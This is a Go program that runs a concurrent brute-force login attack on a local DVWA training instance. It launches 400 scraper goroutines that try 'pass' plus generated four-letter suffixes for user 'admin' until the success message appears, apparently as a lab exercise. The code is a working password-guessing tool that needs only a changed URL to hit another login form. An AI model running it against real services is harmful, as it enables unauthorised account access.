package main

import (
	"fmt"
	"log"
	"sync"
	"time"
	"github.com/gocolly/colly"
	"gonum.org/v1/gonum/stat/combin"
)

var (
	login = "admin"
	password = "password"
	m = make(chan string)
	done = make(chan struct{})
	wg sync.WaitGroup
	t = time.Now()
)

func main() {
	for i := 1; i<=400; i++ {
		wg.Add(1)
		go handler(i)
	}
	generate()

	wg.Wait()
	close(m)
}

func handler(i int) {
	c := colly.NewCollector()
	c.OnHTML("div.vulnerable_code_area p", func(h *colly.HTMLElement) {
		fmt.Println(h.Text, "\nlogin:", login, "\npassword:", password)
		log.Printf("duration: %v\n", time.Since(t))
		close(done)
	})
	// c.OnRequest(func(r *colly.Request) {
	// 	fmt.Println(i, "visiting", r.URL)
	// })
	for {
		select {
		case v := <-m:
			c.Visit("http://localhost/DVWA-master/vulnerabilities/brute/?username=admin&password=pass" + v + "&Login=Login")
		case <-done:
			wg.Done()
			// fmt.Println("done")
			return
		}
	}
}


func generate(){
	lens := []int{25, 25, 25, 25}
	list := combin.Cartesian(lens)
	for _, v := range list {
		select {
			case <- done:
				return
			default:
				m <- IntToWord(v)
		}
	}
}

func IntToWord(intWord[] int) string{
	alphabet := "abcdefghijklmnopqrstuvwxyz"
	word := ""
	for _, v := range intWord{
		word += string(alphabet[v])
	}
	return word
}
